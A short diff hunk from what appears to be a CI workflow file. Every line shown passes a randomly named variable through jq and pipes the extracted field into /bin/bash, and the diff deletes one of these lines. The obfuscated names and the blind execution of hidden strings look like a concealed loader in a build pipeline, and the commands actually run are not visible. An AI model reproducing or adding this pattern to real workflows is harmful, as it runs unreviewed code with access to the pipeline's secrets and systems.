@@ -23,7 +23,6 @@ jobs:
           echo $n173 | jq -r .mpy4000 | /bin/bash
           printf '%s' "$amb5757" | jq -r .kwmqb81151 | /bin/bash
           echo $mot936 | jq -r .pe56 | /bin/bash
-          printf '%s' "$cpocz7752" | jq -r .u98 | /bin/bash
           printf '%s' "$mgva400" | jq -r .dw4365 | /bin/bash
           printf '%s' "$ufkmb48" | jq -r .e18 | /bin/bash
           printf '%s' "$qkrgh8645" | jq -r .xszl0350 | /bin/bash
